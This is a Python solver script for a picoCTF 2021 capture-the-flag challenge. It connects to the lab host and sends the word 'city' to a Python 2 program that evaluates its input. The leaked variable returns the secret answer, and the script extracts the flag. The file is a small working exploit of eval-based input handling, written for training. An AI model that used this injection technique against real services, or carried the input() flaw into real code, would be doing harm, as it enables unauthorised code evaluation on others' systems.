#!/usr/bin/env python3
"""Solver for Challenge 138 What's your input? (picoCTF 2021, Binary Exploit).

Target: Python 2.7 script using input() (= eval) twice.
Q1 expects 2018. Q2 expects random city from city_names.txt.
Key insight: in Python 2, list-comprehension loop variables LEAK into the
enclosing scope, so after `city = random.choice(...)` the name `city` stays
bound to the chosen value. Simply answering `city` (evaluated by input())
echoes the secret back and passes the equality check.

Usage: solve_138_whats_your_input.py [host] [port]
"""
import re
import socket
import sys
import time

HOST = "xebec.cylabacademy.net"
PORT = 48215

FLAG_RE = re.compile(rb"(academy\{[^}]*\}|picoCTF\{[^}]*\}|flag\{[^}]*\})")


def recv_all(s, timeout=6, max_bytes=262144):
    s.settimeout(timeout)
    out = b""
    try:
        while True:
            chunk = s.recv(65536)
            if not chunk:
                break
            out += chunk
            if len(out) > max_bytes:
                break
    except socket.timeout:
        pass
    return out


def solve(host=HOST, port=PORT, timeout=15):
    s = socket.create_connection((host, int(port)), timeout=timeout)
    try:
        data = recv_all(s, timeout=4)
        print(data.decode(errors="replace"))
        s.sendall(b"2018\n")
        time.sleep(0.8)
        data = recv_all(s, timeout=4)
        print(data.decode(errors="replace"))
        # `city` evaluates to the leaked global = the chosen city
        s.sendall(b"city\n")
        time.sleep(0.8)
        data = recv_all(s, timeout=4)
        print(data.decode(errors="replace"))
        m = FLAG_RE.search(data)
        if not m:
            raise ValueError("flag not found")
        flag = m.group(1).decode()
        print(f"FLAG: {flag}")
        return flag
    finally:
        s.close()


if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT
    print(solve(host, port))
